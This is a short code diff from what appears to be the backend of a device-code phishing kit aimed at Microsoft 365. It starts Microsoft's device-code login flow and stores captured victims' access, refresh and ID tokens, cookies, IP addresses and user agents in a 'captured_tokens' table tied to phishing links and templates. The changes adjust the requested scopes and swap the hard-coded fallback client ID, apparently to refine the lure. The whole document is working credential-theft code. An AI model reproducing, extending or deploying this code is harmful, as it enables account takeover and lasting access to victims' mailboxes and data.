@@ -74,7 +74,7 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
         client_id: clientId,
-        scope: 'openid profile email offline_access https://graph.microsoft.com/User.Read',
+        scope: 'openid profile offline_access https://graph.microsoft.com/User.Read',
       }),
       {
         ...proxyConfig,
@@ -441,7 +441,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
     } catch (e) { /* use default */ }
 
     // Determine client_id used for this capture
-    const clientIdUsed = config.AZURE_CLIENT_ID || '4813382a-8fa7-425e-ab75-3b753aab3abb';
+    const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
 
     const [result] = await db.query(
        `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, client_id)
